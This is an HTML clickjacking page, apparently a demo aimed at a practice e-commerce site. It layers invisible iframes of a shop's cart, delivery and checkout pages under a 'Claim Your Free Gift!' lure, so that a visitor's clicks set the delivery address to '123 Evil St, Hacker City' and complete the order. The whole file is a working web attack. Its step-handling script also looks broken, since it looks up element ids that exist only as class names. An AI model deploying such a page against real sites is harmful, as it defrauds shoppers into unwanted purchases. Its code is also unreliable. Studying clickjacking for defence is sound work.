<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Multistep Clickjacking Demo</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
        }
        .container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
            z-index: 100;
            background-color: rgba(255, 255, 255, 0.9);
        }
        iframe {
            position: relative;
            width: 500px;
            height: 700px;
            opacity: 0;
            z-index: 2;
            display: none;
            border: none;
        }
        #iframe-cart {
            display: block;
        }
        .firstClick, .secondClick, .thirdClick {
            position: absolute;
            z-index: 1;
            font-size: 18px;
            padding: 10px;
            color: red;
            cursor: pointer;
            font-weight: bold;
            opacity: 0;
        }
        .firstClick {
            bottom: 20px;
            right: 20px;
        }
        .secondClick {
            top: 220px;
            left: 225px;
        }
        .thirdClick {
            bottom: 20px;
            right: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Claim Your Free Gift!</h1>
        <p>Click the buttons below to get your exclusive offer!</p>
    </div>
    <iframe id="iframe-cart" src="https://security-in-e-commerce.onrender.com/cart" scrolling="no"></iframe>
    <iframe id="iframe-delivery" src="https://security-in-e-commerce.onrender.com/delivery?address=123%20Evil%20St,%20Hacker%20City" scrolling="no"></iframe>
    <iframe id="iframe-checkout" src="https://security-in-e-commerce.onrender.com/checkout" scrolling="no"></iframe>
    <div class="firstClick" onclick="nextStep('cart')">Click me first</div>
    <div class="secondClick" style="display: none;" onclick="nextStep('delivery')">Click me next</div>
    <div class="thirdClick" style="display: none;" onclick="nextStep('checkout')">Click me last</div>
    <script>
        let currentStep = 'cart';

        function nextStep(step) {
            document.getElementById(`iframe-${step}`).style.display = 'none';
            document.getElementById(`${step}Click`).style.display = 'none';

            if (step === 'cart') {
                currentStep = 'delivery';
                document.getElementById('iframe-delivery').style.display = 'block';
                document.getElementById('secondClick').style.display = 'block';
            } else if (step === 'delivery') {
                currentStep = 'checkout';
                document.getElementById('iframe-checkout').style.display = 'block';
                document.getElementById('thirdClick').style.display = 'block';
            } else if (step === 'checkout') {
                alert('You completed the clickjacking attack!');
            }
        }
    </script>
</body>
</html>
